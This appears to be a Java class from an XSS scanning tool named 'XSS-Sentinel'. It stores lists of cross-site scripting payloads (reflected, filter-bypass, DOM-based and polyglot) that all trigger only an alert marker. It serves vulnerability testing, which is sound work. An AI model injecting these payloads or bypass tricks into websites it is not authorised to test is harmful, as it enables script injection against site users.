package com.xsssentinel.payloads;

import java.util.Arrays;
import java.util.List;

public class PayloadManager {

    // Basic reflected XSS payloads
    private static final List<String> BASIC_PAYLOADS = Arrays.asList(
            "<script>alert('XSS-Sentinel')</script>",
            "<img src=x onerror=alert('XSS-Sentinel')>",
            "<svg onload=alert('XSS-Sentinel')>",
            "'\"><script>alert('XSS-Sentinel')</script>",
            "<body onload=alert('XSS-Sentinel')>"
    );

    // Filter bypass payloads
    private static final List<String> BYPASS_PAYLOADS = Arrays.asList(
            "<ScRiPt>alert('XSS-Sentinel')</sCrIpT>",
            "<img src=x onerror=alert`XSS-Sentinel`>",
            "<svg/onload=alert('XSS-Sentinel')>",
            "%-3Cscript%-3Ealert('XSS-Sentinel')%-3C/script%-3E",
            "<iframe src=javascript:alert('XSS-Sentinel')>"
    );

    // DOM-based XSS payloads
    private static final List<String> DOM_PAYLOADS = Arrays.asList(
            "javascript:alert('XSS-Sentinel')",
            "#<script>alert('XSS-Sentinel')</script>",
            "<img src=1 onerror=alert('XSS-Sentinel')>",
            "'-alert('XSS-Sentinel')-'",
            "\"-alert('XSS-Sentinel')-\""
    );

    // Polyglot payloads - work in multiple contexts
    private static final List<String> POLYGLOT_PAYLOADS = Arrays.asList(
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS-Sentinel') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS-Sentinel')//>>",
            "'\"-->></styles></script><svg onload=alert('XSS-Sentinel')>",
            "<script>/*'/*`/*\"/*</script><svg onload=alert('XSS-Sentinel')/*>"
    );

    public List<String> getBasicPayloads() {
        return BASIC_PAYLOADS;
    }

    public List<String> getBypassPayloads() {
        return BYPASS_PAYLOADS;
    }

    public List<String> getDomPayloads() {
        return DOM_PAYLOADS;
    }

    public List<String> getPolyglotPayloads() {
        return POLYGLOT_PAYLOADS;
    }

    public List<String> getAllPayloads() {
        return Arrays.asList(
                        BASIC_PAYLOADS,
                        BYPASS_PAYLOADS,
                        DOM_PAYLOADS,
                        POLYGLOT_PAYLOADS
                ).stream()
                .flatMap(List::stream)
                .collect(java.util.stream.Collectors.toList());
    }
}